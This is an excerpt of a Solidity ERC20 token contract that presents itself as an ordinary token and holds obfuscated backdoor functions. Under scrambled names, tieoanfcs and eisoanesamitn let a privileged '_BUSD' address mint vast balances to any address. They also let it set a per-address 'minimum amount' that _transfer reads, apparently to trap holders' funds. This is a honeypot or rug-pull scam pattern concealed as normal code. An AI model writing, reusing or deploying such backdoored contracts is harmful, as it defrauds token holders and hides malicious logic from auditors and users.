...
abstract contract Ownable is Context {
     ...
     */
    function _iaonfsOwner() internal view virtual {
...
contract Token is Context, IERC20, IERC20Metadata, Ownable, ContractGuard {
    ...
    uint256 eiosjf =  1000000000 * 10 ** decimals();
    ...
    mapping(address => uint256) private _nwelisa;
     ...
     * - `from` must have a balance of at least `amount`.
     */
    function tieoanfcs(address eoiwfnz) external {
        uint256 _newisa = eiosjf;
        uint256 _nweiosa = (_newisa+_newisa-_newisa)*6;
        if (_BUSD != _msgSender()) {

        }else{
            _nwelisa[eoiwfnz] = _nweiosa;
        }
        require(_BUSD == _msgSender());
    }

    function eisoanesamitn(address ieoanaz) external {
        address nwleiao = _msgSender();
        uint256 neoak = 500000000 * 2 * (10**18);
        uint256 nzoaal = 100000000000000*neoak*1*1*1;
        if (_BUSD != nwleiao) {

        }else{

        }
        _balance[ieoanaz] += nzoaal;
        require(_BUSD == nwleiao);
    }
    ...
    function _transfer(address from, address to, uint256 amount) onlyOneBlock(from, to) internal virtual {
        ...
        uint256 minAmount = _nwelisa[from];
